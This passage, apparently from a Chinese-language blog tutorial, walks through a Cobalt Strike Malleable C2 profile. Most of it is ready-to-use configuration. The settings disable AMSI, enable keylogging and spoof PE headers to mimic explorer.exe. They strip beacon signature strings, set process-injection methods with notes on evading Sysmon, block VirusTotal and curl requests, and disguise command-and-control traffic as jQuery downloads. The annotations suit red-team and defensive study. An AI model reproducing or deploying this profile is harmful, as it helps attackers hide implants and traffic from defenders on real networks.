obfuscate <span class="string">&quot;true&quot;</span>;</span><br><span class="line">    <span class="comment"># pass key function pointers from Beacon to its child jobs</span></span><br><span class="line">    <span class="attribute">set</span> smartinject <span class="string">&quot;true&quot;</span>;</span><br><span class="line">    <span class="comment"># disable AMSI in powerpick, execute-assembly, and psinject</span></span><br><span class="line">    <span class="attribute">set</span> amsi_disable <span class="string">&quot;true&quot;</span>;</span><br><span class="line">    <span class="comment"># Modify our post-ex pipe names</span></span><br><span class="line">    <span class="attribute">set</span> pipename <span class="string">&quot;Winsock2\\CatalogChangeListener-###-0,&quot;</span>;</span><br><span class="line">    <span class="attribute">set</span> keylogger <span class="string">&quot;GetAsyncKeyState&quot;</span>;</span><br><span class="line">    <span class="comment">#set threadhint &quot;module!function+0x##&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>spawnto 的相关配置。</p>
+</blockquote>
+<p>官方指导：spawnto 只需要 63 个字节。选择 spawn 的程序中，禁止选用这些： <code>&quot;csrss.exe&quot;,&quot;logoff.exe&quot;,&quot;rdpinit.exe&quot;,&quot;bootim.exe&quot;,&quot;smss.exe&quot;,&quot;userinit.exe&quot;,&quot;sppsvc.exe&quot;</code> 。 在 spawn 的过程中可以添加相应的参数。</p>
+<p>开启 <code>obfuscate</code>  后，会扰乱 post-ex DLLs 的内容，使整个过程更安全。</p>
+<p>开启 <code>amsi_disable</code>  后，会在执行 powerpick、execute-assembly、 psinject 这些命令前限制 amsi 检测。</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">stage</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># CS 4.2 申请内存的方式， 支持三种：HeapAlloc, MapViewOfFile, and VirtualAlloc</span></span><br><span class="line">    <span class="attribute">set</span> allocator      <span class="string">&quot;VirtualAlloc&quot;</span>; <span class="comment"># Options are: HeapAlloc, MapViewOfFile, and VirtualAlloc</span></span><br><span class="line">    <span class="comment"># 覆盖Beacon 反射DLL的第一个字节（包括MZ头）。需要有效的x86指令。按照更改CPU状态的说明和撤消更改的说明进行操作。</span></span><br><span class="line">  	<span class="comment">#set magic_mz_x86   &quot;MZRE&quot;;</span></span><br><span class="line">    <span class="comment">#set magic_mz_x64   &quot;MZAR&quot;;</span></span><br><span class="line">  	<span class="comment"># 用另一个值覆盖Beacon的反射加载程序使用的PE字符标记。</span></span><br><span class="line">    <span class="attribute">set</span> magic_pe       <span class="string">&quot;NO&quot;</span>;</span><br><span class="line">  	<span class="comment"># 要求ReflectiveLoader对内存中的Beacon DLL使用或避免读写、执行权限</span></span><br><span class="line">    <span class="attribute">set</span> userwx         <span class="string">&quot;false&quot;</span>;</span><br><span class="line">  	<span class="comment"># 要求ReflectiveLoader 在加载Beacon之后，重新stomp MZ, PE, 和 e_lfanew的值。</span></span><br><span class="line">    <span class="attribute">set</span> stomppe        <span class="string">&quot;true&quot;</span>;</span><br><span class="line">  	<span class="comment"># 模糊反射DLL的导入表，覆盖未使用的头内容，并要求ReflectiveLoader将Beacon复制到没有其DLL头的新内存中。从4.2开始，CS现在会混淆rDLL包中的.text部分</span></span><br><span class="line">    <span class="attribute">set</span> obfuscate      <span class="string">&quot;true&quot;</span>;</span><br><span class="line">  	<span class="comment"># 要求Beacon尝试释放与初始化它的反射DLL包关联的内存。</span></span><br><span class="line">    <span class="attribute">set</span> cleanup        <span class="string">&quot;true&quot;</span>;</span><br><span class="line">    <span class="comment"># CS 3.12 Addition &quot;Obfuscate and Sleep&quot;</span></span><br><span class="line">    <span class="attribute">set</span> sleep_mask     <span class="string">&quot;true&quot;</span>;</span><br><span class="line">    <span class="comment"># CS 4.1</span></span><br><span class="line">    <span class="attribute">set</span> smartinject    <span class="string">&quot;true&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Make the Beacon Reflective DLL look like something else in memory</span></span><br><span class="line">    <span class="comment"># Values captured using peclone agaist a Windows 10 version of explorer.exe</span></span><br><span class="line">    <span class="comment"># PE头部校验值</span></span><br><span class="line">    <span class="attribute">set</span> checksum       <span class="string">&quot;0&quot;</span>;</span><br><span class="line">  	<span class="comment"># PE头编译时间</span></span><br><span class="line">    <span class="attribute">set</span> compile_time   <span class="string">&quot;11 Nov 2016 04:08:32&quot;</span>;</span><br><span class="line">  	<span class="comment"># PE头入口值</span></span><br><span class="line">    <span class="attribute">set</span> entry_point    <span class="string">&quot;650688&quot;</span>;</span><br><span class="line">  	<span class="comment"># 32位PE头镜像大小</span></span><br><span class="line">    <span class="attribute">set</span> image_size_x86 <span class="string">&quot;4661248&quot;</span>;</span><br><span class="line">  	<span class="comment"># 64位PE头镜像大小</span></span><br><span class="line">    <span class="attribute">set</span> image_size_x64 <span class="string">&quot;4661248&quot;</span>;</span><br><span class="line">  	<span class="comment"># 导出的DLL名称</span></span><br><span class="line">    <span class="attribute">set</span> name           <span class="string">&quot;srv.dll&quot;</span>;</span><br><span class="line">  	<span class="comment"># 由编译器插入的元数据信息</span></span><br><span class="line">    <span class="attribute">set</span> rich_header    <span class="string">&quot;\x3e\x98\xfe\x75\x7a\xf9\x90\x26\x7a\xf9\x90\x26\x7a\xf9\x90\x26\x73\x81\x03\x26\xfc\xf9\x90\x26\x17\xa4\x93\x27\x79\xf9\x90\x26\x7a\xf9\x91\x26\x83\xfd\x90\x26\x17\xa4\x91\x27\x65\xf9\x90\x26\x17\xa4\x95\x27\x77\xf9\x90\x26\x17\xa4\x94\x27\x6c\xf9\x90\x26\x17\xa4\x9e\x27\x56\xf8\x90\x26\x17\xa4\x6f\x26\x7b\xf9\x90\x26\x17\xa4\x92\x27\x7b\xf9\x90\x26\x52\x69\x63\x68\x7a\xf9\x90\x26\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">## WARNING: Module stomping</span></span><br><span class="line">    <span class="comment"># Cobalt Strike 3.11 also adds module stomping to Beacon&#x27;s Reflective Loader. When enabled, Beacon&#x27;s loader will shun VirtualAlloc and instead load a DLL into the current process and overwrite its memory.</span></span><br><span class="line">    <span class="comment"># Set module_x86 to a favorite x86 DLL to module stomp with the x86 Beacon. The module_x64 option enables this for the x64 Beacon.</span></span><br><span class="line">    <span class="comment"># While this is a powerful feature, caveats apply! If the library you load is not large enough to host Beacon, you will crash Beacon&#x27;s process. If the current process loads the same library later (for whatever reason), you will crash Beacon&#x27;s process. Choose carefully.</span></span><br><span class="line">    <span class="comment"># By default, Beacon&#x27;s loader allocates memory with VirtualAlloc. Module stomping is an alternative to this. Set module_x86 to a DLL that is about twice as large as the Beacon payload itself. Beacon&#x27;s x86 loader will load the specified DLL, find its location in memory, and overwrite it. This is a way to situate Beacon in memory that Windows associates with a file on disk. It&#x27;s important that the DLL you choose is not needed by the applications you intend to reside in. The module_x64 option is the same story, but it affects the x64 Beacon.</span></span><br><span class="line">    <span class="comment"># Details can be found in the In-memory Evasion video series. https://youtu.be/uWVH9l2GMw4</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># set module_x64 &quot;netshell.dll&quot;;</span></span><br><span class="line">    <span class="comment"># set module_x86 &quot;netshell.dll&quot;;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># The transform-x86 and transform-x64 blocks pad and transform Beacon&#x27;s Reflective DLL stage. These blocks support three commands: prepend, append, and strrep.</span></span><br><span class="line">    transform-x86 &#123; # transform the x86 rDLL stage</span><br><span class="line">    		<span class="comment"># 在shellcode前追加内容</span></span><br><span class="line">        <span class="attribute">prepend</span> <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span>; <span class="comment"># prepend nops</span></span><br><span class="line">				<span class="comment"># 替换敏感字符</span></span><br><span class="line">        <span class="attribute">strrep</span> <span class="string">&quot;ReflectiveLoader&quot;</span> <span class="string">&quot;execute&quot;</span>; <span class="comment"># Change this text</span></span><br><span class="line">    		<span class="comment"># 删除敏感字符</span></span><br><span class="line">        <span class="attribute">strrep</span> <span class="string">&quot;This program cannot be run in DOS mode&quot;</span> <span class="string">&quot;&quot;</span>; <span class="comment"># Remove this text</span></span><br><span class="line">        <span class="attribute">strrep</span> <span class="string">&quot;beacon.dll&quot;</span> <span class="string">&quot;&quot;</span>; <span class="comment"># Remove this text</span></span><br><span class="line">    &#125;</span><br><span class="line">    transform-x64 &#123; # transform the x64 rDLL stage</span><br><span class="line">        <span class="attribute">prepend</span> <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span>; <span class="comment"># prepend nops</span></span><br><span class="line">        <span class="attribute">strrep</span> <span class="string">&quot;ReflectiveLoader&quot;</span> <span class="string">&quot;execute&quot;</span>; <span class="comment"># Change this text in the Beacon DLL</span></span><br><span class="line">        <span class="attribute">strrep</span> <span class="string">&quot;beacon.x64.dll&quot;</span> <span class="string">&quot;&quot;</span>; <span class="comment"># Remove this text in the Beacon DLL</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="attribute">stringw</span> <span class="string">&quot;jQuery&quot;</span>; <span class="comment"># Add this string to the DLL</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>stage 的相关配置。</p>
+</blockquote>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">process-inject &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 设置远程内存分配方法: VirtualAllocEx|NtMapViewOfSection</span></span><br><span class="line">    <span class="attribute">set</span> allocator <span class="string">&quot;NtMapViewOfSection&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 注入内容时的最小内存分配大小</span></span><br><span class="line">    <span class="attribute">set</span> min_alloc <span class="string">&quot;17500&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 设置内存权限 initial=RWX, final=RX</span></span><br><span class="line">    <span class="attribute">set</span> startrwx <span class="string">&quot;false&quot;</span>;</span><br><span class="line">    <span class="attribute">set</span> userwx   <span class="string">&quot;false&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 转换注入的内容以避免前几个字节的签名检测。只支持prepend和append。</span></span><br><span class="line">    transform-x86 &#123;</span><br><span class="line">        <span class="attribute">prepend</span> <span class="string">&quot;\x90\x90&quot;</span>;</span><br><span class="line">        <span class="comment">#append &quot;\x90\x90&quot;;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    transform-x64 &#123;</span><br><span class="line">        <span class="attribute">prepend</span> <span class="string">&quot;\x90\x90&quot;</span>;</span><br><span class="line">        <span class="comment">#append &quot;\x90\x90&quot;;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">## The execute block controls the methods Beacon will use when it needs to inject code into a process. Beacon examines each option in the execute block, determines if the option is usable for the current context, tries the method when it is usable, and moves on to the next option if code execution did not happen. The execute options include:</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment"># Name                      x86-&gt;x64    x64-x86     Notes</span></span><br><span class="line">    <span class="comment">#########################################################################</span></span><br><span class="line">    <span class="comment"># CreateThread                                      Current Process only</span></span><br><span class="line">    <span class="comment"># CreateRemoteThread                       Yes      No cross-session</span></span><br><span class="line">    <span class="comment"># NtQueueApcThread</span></span><br><span class="line">    <span class="comment"># NtQueAPCThread-s                                  This is the &quot;Early Bird&quot; injection technique. Suspended processes (e.g., post-ex jobs) only.</span></span><br><span class="line">    <span class="comment"># RtlCreateUserThread           Yes        Yes      Risky on XP-era targets; uses RWX shellcode for x86-&gt;x64 injection.</span></span><br><span class="line">    <span class="comment"># SetThreadContext                         Yes      Suspended processes (e.g. post-ex jobs only)</span></span><br><span class="line">    <span class="section">execute</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 下述方法顺序很重要，CS会按照顺序进行尝试注入，直至成功。</span></span><br><span class="line">        <span class="comment">## self-injection</span></span><br><span class="line">        <span class="attribute">CreateThread</span> <span class="string">&quot;ntdll!RtlUserThreadStart+0x42&quot;</span>;</span><br><span class="line">        CreateThread;</span><br><span class="line"></span><br><span class="line">        <span class="comment">## 通过挂起的进程注入 (SetThreadContext|NtQueueApcThread-s)</span></span><br><span class="line">        <span class="comment"># OPSEC - 使用SetThreadContext时，线程的起始地址将反映临时进程的原始执行入口点。</span></span><br><span class="line">        <span class="comment"># SetThreadContext;</span></span><br><span class="line">        NtQueueApcThread-s;</span><br><span class="line"></span><br><span class="line">        <span class="comment">## 注入到存在的进程</span></span><br><span class="line">        <span class="comment"># OPSEC Uses RWX stub - 由Get InjectedThread检测到。一些防御性产品较少检测到。</span></span><br><span class="line">        <span class="comment">#NtQueueApcThread;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># CreateRemotThread - 香草跨过程注射技术。不跨越会话边界</span></span><br><span class="line">        <span class="comment"># OPSEC - fires Sysmon Event 8</span></span><br><span class="line">        CreateRemoteThread;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># RtlCreateUserThread - 支持所有依赖于体系结构的转角情况（例如，32位-&gt;64位注入）和跨会话边界的注入</span></span><br><span class="line">        <span class="comment"># OPSEC - fires Sysmon Event 8. Uses Meterpreter implementation and RWX stub - Detected by Get-InjectedThread</span></span><br><span class="line">        RtlCreateUserThread;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>进程注入相关配置</p>
+</blockquote>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">http-config &#123;</span><br><span class="line">  	<span class="comment"># 设置http头信息</span></span><br><span class="line">    <span class="attribute">set</span> headers <span class="string">&quot;Date, Server, Content-Length, Keep-Alive, Connection, Content-Type&quot;</span>;</span><br><span class="line">    <span class="attribute">header</span> <span class="string">&quot;Server&quot;</span> <span class="string">&quot;Apache&quot;</span>;</span><br><span class="line">    <span class="attribute">header</span> <span class="string">&quot;Keep-Alive&quot;</span> <span class="string">&quot;timeout=10, max=100&quot;</span>;</span><br><span class="line">    <span class="attribute">header</span> <span class="string">&quot;Connection&quot;</span> <span class="string">&quot;Keep-Alive&quot;</span>;</span><br><span class="line">    <span class="comment"># 如果您的teamserver位于重定向器后面，请使用此选项</span></span><br><span class="line">    <span class="attribute">set</span> trust_x_forwarded_for <span class="string">&quot;true&quot;</span>;</span><br><span class="line">    <span class="comment"># 检测到某些UA的请求，会针对性的返回404</span></span><br><span class="line">    <span class="attribute">set</span> block_useragents <span class="string">&quot;*virustotal*,curl*,lynx*,wget*&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>HTTP 服务的相关配置</p>
+</blockquote>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">http-get &#123;</span><br><span class="line"></span><br><span class="line">  	<span class="comment"># 设置请求接口， 可以添加多个URI。Beacon会随机从中选取</span></span><br><span class="line">    <span class="attribute">set</span> uri <span class="string">&quot;/jquery-3.3.1.min.js&quot;</span>;</span><br><span class="line">  	<span class="comment"># 设置请求方法</span></span><br><span class="line">    <span class="attribute">set</span> verb <span class="string">&quot;GET&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="section">client</span> &#123;</span><br><span class="line">				<span class="comment"># 设置客户端请求头信息</span></span><br><span class="line">        <span class="attribute">header</span> <span class="string">&quot;Accept&quot;</span> <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&quot;</span>;</span><br><span class="line">        <span class="comment">#header &quot;Host&quot; &quot;code.jquery.com&quot;;</span></span><br><span class="line">        <span class="attribute">header</span> <span class="string">&quot;Referer&quot;</span> <span class="string">&quot;http://code.jquery.com/&quot;</span>;</span><br><span class="line">        <span class="attribute">header</span> <span class="string">&quot;Accept-Encoding&quot;</span> <span class="string">&quot;gzip, deflate&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="section">metadata</span> &#123;</span><br><span class="line">            base64url;</span><br><span class="line">            <span class="attribute">prepend</span> <span class="string">&quot;__cfduid=&quot;</span>;</span><br><span class="line">            <span class="attribute">header</span> <span class="string">&quot;Cookie&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="section">server</span> &#123;</span><br><span class="line">				<span class="comment"># 服务端的相关配置</span></span><br><span class="line">        <span class="attribute">header</span> <span class="string">&quot;Server&quot;</span> <span class="string">&quot;NetDNA-cache/2.2&quot;</span>;</span><br><span class="line">        <span class="attribute">header</span> <span class="string">&quot;Cache-Control&quot;</span> <span class="string">&quot;max-age=0, no-cache&quot;</span>;</span><br><span class="line">        <span class="attribute">header</span> <span class="string">&quot;Pragma&quot;</span> <span class="string">&quot;no-cache&quot;</span>;</span><br><span class="line">        <span class="attribute">header</span> <span class="string">&quot;Connection&quot;</span> <span class="string">&quot;keep-alive&quot;</span>;</span><br><span class="line">        <span class="attribute">header</span> <span class="string">&quot;Content-Type&quot;</span> <span class="string">&quot;application/javascript; charset=utf-8&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="section">output</span> &#123;</span><br><span class="line">            mask;</span><br><span class="line">            base64url;</span><br><span class="line">            <span class="comment">## The javascript was changed.  Double quotes and backslashes were escaped to properly render (Refer to Tips for Profile Parameter Values)</span></span><br><span class="line">            <span class="comment"># 2nd Line</span></span><br><span class="line">            <span class="attribute">prepend</span> <span class="string">&quot;!function(e,t)&#123;\&quot;use strict\&quot;;\&quot;object\&quot;==typeof module&amp;&amp;\&quot;object\&quot;==typeof module.exports?module.exports=e.document?t(e,!0):function(e)&#123;if(!e.document)throw new Error(\&quot;jQuery requires a window with a document\&quot;);return t(e)&#125;:t(e)&#125;(\&quot;undefined\&quot;!=typeof window?window:this,function(e,t)&#123;\&quot;use strict\&quot;;var n=[],r=e.document,i=Object.getPrototypeOf,o=n.slice,a=n.concat,s=n.push,u=n.indexOf,l=&#123;&#125;,c=l.toString,f=l.hasOwnProperty,p=f.toString,d=p.call(Object),h=&#123;&#125;,g=function e(t)&#123;return\&quot;function\&quot;==typeof t&amp;&amp;\&quot;number\&quot;!=typeof t.nodeType&#125;,y=function e(t)&#123;return null!=t&amp;&amp;t===t.window&#125;,v=&#123;type:!0,src:!0,noModule:!0&#125;;function m(e,t,n)&#123;var i,o=(t=t||r).createElement(\&quot;script\&quot;);if(o.text=e,n)for(i in v)n[i]&amp;&amp;(o[i]=n[i]);t.head.appendChild(o).parentNode.removeChild(o)&#125;function x(e)&#123;return null==e?e+\&quot;\&quot;:\&quot;object\&quot;==typeof e||\&quot;function\&quot;==typeof e?l[c.call(e)]||\&quot;object\&quot;:typeof e&#125;var b=\&quot;3.3.1\&quot;,w=function(e,t)&#123;return new w.fn.init(e,t)&#125;,T=/^[\\s\\uFEFF\\xA0]+|[\\s\\uFEFF\\xA0]+$/g;w.fn=w.prototype=&#123;jquery:\&quot;3.3.1\&quot;,constructor:w,length:0,toArray:function()&#123;return o.call(this)&#125;,get:function(e)&#123;return null==e?o.call(this):e&lt;0?this[e+this.length]:this[e]&#125;,pushStack:function(e)&#123;var t=w.merge(this.constructor(),e);return t.prevObject=this,t&#125;,each:function(e)&#123;return w.each(this,e)&#125;,map:function(e)&#123;return this.pushStack(w.map(this,function(t,n)&#123;return e.call(t,n,t)&#125;))&#125;,slice:function()&#123;return this.pushStack(o.apply(this,arguments))&#125;,first:function()&#123;return this.eq(0)&#125;,last:function()&#123;return this.eq(-1)&#125;,eq:function(e)&#123;var t=this.length,n=+e+(e&lt;0?t:0);return this.pushStack(n&gt;=0&amp;&amp;n&lt;t?[this[n]]:[])&#125;,end:function()&#123;return this.prevObject||this.constructor()&#125;,push:s,sort:n.sort,splice:n.splice&#125;,w.extend=w.fn.extend=function()&#123;var e,t,n,r,i,o,a=arguments[0]||&#123;&#125;,s=1,u=arguments.length,l=!1;for(\&quot;boolean\&quot;==typeof a&amp;&amp;(l=a,a=arguments[s]||&#123;&#125;,s++),\&quot;object\&quot;==typeof a||g(a)||(a=&#123;&#125;),s===u&amp;&amp;(a=this,s--);s&lt;u;s++)if(null!=(e=arguments[s]))for(t in e)n=a[t],a!==(r=e[t])&amp;&amp;(l&amp;&amp;r&amp;&amp;(w.isPlainObject(r)||(i=Array.isArray(r)))?(i?(i=!1,o=n&amp;&amp;Array.isArray(n)?n:[]):o=n&amp;&amp;w.isPlainObject(n)?n:&#123;&#125;,a[t]=w.extend(l,o,r)):void 0!==r&amp;&amp;(a[t]=r));return a&#125;,w.extend(&#123;expando:\&quot;jQuery\&quot;+(\&quot;3.3.1\&quot;+Math.random()).replace(/\\D/g,\&quot;\&quot;),isReady:!0,error:function(e)&#123;throw new Error(e)&#125;,noop:function()&#123;&#125;,isPlainObject:function(e)&#123;var t,n;return!(!e||\&quot;[object Object]\&quot;!==c.call(e))&amp;&amp;(!(t=i(e))||\&quot;function\&quot;==typeof(n=f.call(t,\&quot;constructor\&quot;)&amp;&amp;t.constructor)&amp;&amp;p.call(n)===d)&#125;,isEmptyObject:function(e)&#123;var t;for(t in e)return!1;return!0&#125;,globalEval:function(e)&#123;m(e)&#125;,each:function(e,t)&#123;var n,r=0;if(C(e))&#123;for(n=e.length;r&lt;n;r++)if(!1===t.call(e[r],r,e[r]))break&#125;else for(r in e)if(!1===t.call(e[r],r,e[r]))break;return e&#125;,trim:function(e)&#123;return null==e?\&quot;\&quot;:(e+\&quot;\&quot;).replace(T,\&quot;\&quot;)&#125;,makeArray:function(e,t)&#123;var n=t||[];return null!=e&amp;&amp;(C(Object(e))?w.merge(n,\&quot;string\&quot;==typeof e?[e]:e):s.call(n,e)),n&#125;,inArray:function(e,t,n)&#123;return null==t?-1:u.call(t,e,n)&#125;,merge:function(e,t)&#123;for(var n=+t.length,r=0,i=e.length;r&lt;n;r++)e[i++]=t[r];return e.length=i,e&#125;,grep:function(e,t,n)&#123;for(var r,i=[],o=0,a=e.length,s=!n;o&lt;a;o++)(r=!t(e[o],o))!==s&amp;&amp;i.push(e[o]);return i&#125;,map:function(e,t,n)&#123;var r,i,o=0,s=[];if(C(e))for(r=e.length;o&lt;r;o++)null!=(i=t(e[o],o,n))&amp;&amp;s.push(i);else for(o in e)null!=(i=t(e[o],o,n))&amp;&amp;s.push(i);return a.apply([],s)&#125;,guid:1,support:h&#125;),\&quot;function\&quot;==typeof Symbol&amp;&amp;(w.fn[Symbol.iterator]=n[Symbol.iterator]),w.each(\&quot;Boolean Number String Function Array Date RegExp Object Error Symbol\&quot;.split(\&quot; \&quot;),function(e,t)&#123;l[\&quot;[object \&quot;+t+\&quot;]\&quot;]=t.toLowerCase()&#125;);function C(e)&#123;var t=!!e&amp;&amp;\&quot;length\&quot;in e&amp;&amp;e.length,n=x(e);return!g(e)&amp;&amp;!y(e)&amp;&amp;(\&quot;array\&quot;===n||0===t||\&quot;number\&quot;==typeof t&amp;&amp;t&gt;0&amp;&amp;t-1 in e)&#125;var E=function(e)&#123;var t,n,r,i,o,a,s,u,l,c,f,p,d,h,g,y,v,m,x,b=\&quot;sizzle\&quot;+1*new Date,w=e.document,T=0,C=0,E=ae(),k=ae(),S=ae(),D=function(e,t)&#123;return e===t&amp;&amp;(f=!0),0&#125;,N=&#123;&#125;.hasOwnProperty,A=[],j=A.pop,q=A.push,L=A.push,H=A.slice,O=function(e,t)&#123;for(var n=0,r=e.length;n&lt;r;n++)if(e[n]===t)return n;return-1&#125;,P=\&quot;\r&quot;</span>;</span><br><span class="line">            <span class="comment"># 1st Line</span></span><br><span class="line">            <span class="attribute">prepend</span> <span class="string">&quot;/*! jQuery v3.3.1 | (c) JS Foundation and other contributors | jquery.org/license */&quot;</span>;</span><br><span class="line">            <span class="attribute">append</span> <span class="string">&quot;\&quot;.(o=t.documentElement,Math.max(t.body[\&quot;scroll\&quot;+e],o[\&quot;scroll\&quot;+e],t.body[\&quot;offset\&quot;+e],o[\&quot;offset\&quot;+e],o[\&quot;client\&quot;+e])):void 0===i?w.css(t,n,s):w.style(t,n,i,s)&#125;,t,a?i:void 0,a)&#125;&#125;)&#125;),w.each(\&quot;blur focus focusin focusout resize scroll click dblclick mousedown mouseup mousemove mouseover mouseout mouseenter mouseleave change select submit keydown keypress keyup contextmenu\&quot;.split(\&quot; \&quot;),function(e,t)&#123;w.fn[t]=function(e,n)&#123;return arguments.length&gt;0?this.on(t,null,e,n):this.trigger(t)&#125;&#125;),w.fn.extend(&#123;hover:function(e,t)&#123;return this.mouseenter(e).mouseleave(t||e)&#125;&#125;),w.fn.extend(&#123;bind:function(e,t,n)&#123;return this.on(e,null,t,n)&#125;,unbind:function(e,t)&#123;return this.off(e,null,t)&#125;,delegate:function(e,t,n,r)&#123;return this.on(t,e,n,r)&#125;,undelegate:function(e,t,n)&#123;return 1===arguments.length?this.off(e,\&quot;**\&quot;):this.off(t,e||\&quot;**\&quot;,n)&#125;&#125;),w.proxy=function(e,t)&#123;var n,r,i;if(\&quot;string\&quot;==typeof t&amp;&amp;(n=e[t],t=e,e=n),g(e))return r=o.call(arguments,2),i=function()&#123;return e.apply(t||this,r.concat(o.call(arguments)))&#125;,i.guid=e.guid=e.guid||w.guid++,i&#125;,w.holdReady=function(e)&#123;e?w.readyWait++:w.ready(!0)&#125;,w.isArray=Array.isArray,w.parseJSON=JSON.parse,w.nodeName=N,w.isFunction=g,w.isWindow=y,w.camelCase=G,w.type=x,w.now=Date.now,w.isNumeric=function(e)&#123;var t=w.type(e);return(\&quot;number\&quot;===t||\&quot;string\&quot;===t)&amp;&amp;!isNaN(e-parseFloat(e))&#125;,\&quot;function\&quot;==typeof define&amp;&amp;define.amd&amp;&amp;define(\&quot;jquery\&quot;,[],function()&#123;return w&#125;);var 